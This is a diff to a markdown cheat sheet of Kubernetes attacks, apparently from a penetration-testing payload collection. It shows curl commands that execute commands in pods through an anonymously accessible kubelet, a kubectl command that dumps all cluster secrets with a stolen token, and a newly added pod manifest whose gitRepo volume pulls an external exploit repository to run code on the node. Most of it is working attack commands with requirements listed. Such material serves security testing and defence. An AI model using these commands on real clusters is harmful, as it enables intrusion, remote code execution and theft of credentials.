@@ -44,8 +44,11 @@
 
 ### Accessible kubelet on 10250/TCP
 
-Requirements:
+**Requirements**:
+
 * `--anonymous-auth`: Enables anonymous requests to the Kubelet server
+
+**Exploit**:
 
 * Getting pods: `curl -ks https://worker:10250/pods`
 * Run commands: `curl -Gks https://worker:10250/exec/{namespace}/{pod}/{container} -d 'input=1' -d 'output=1' -d'tty=1' -d 'command=ls' -d 'command=/'`
@@ -60,8 +63,40 @@ Use the service account token:
 * with kubectl: ` kubectl --insecure-skip-tls-verify=true --server="https://master:6443" --token="<TOKEN>" get secrets --all-namespaces -o json`
 
 
+### Create gitRepo Volumes to Execute Code
+
+**Requirements**:
+
+* [`gitRepo`](https://kubernetes.io/docs/concepts/storage/volumes/#gitrepo) volume type enabled
+* `create` rights on pods
+
+**Exploit**:
+
+```yml
+apiVersion: v1
+kind: Pod
+metadata:
+  name: test-pd
+spec:
+  containers:
+  - image: alpine:latest
+    command: ["sleep","86400"]
+    name: test-container
+    volumeMounts:
+    - mountPath: /gitrepo
+      name: gitvolume
+  volumes:
+  - name: gitvolume
+    gitRepo:
+      directory: g/.git
+      repository: https://github.com/raesene/repopodexploit.git
+      revision: main
+```
+
+
 ## References
 
 * [Attacking Kubernetes through Kubelet - Withsecure Labs- 11 January, 2019](https://labs.withsecure.com/publications/attacking-kubernetes-through-kubelet)
 * [kubehound - Attack Reference](https://kubehound.io/reference/attacks/)
 * [KubeHound: Identifying attack paths in Kubernetes clusters - Datadog - October 2, 2023](https://securitylabs.datadoghq.com/articles/kubehound-identify-kubernetes-attack-paths/)
+* [Fun With GitRepo Volumes - Rory McCune - JULY 10TH, 2024](https://raesene.github.io/blog/2024/07/10/Fun-With-GitRepo-Volumes/)
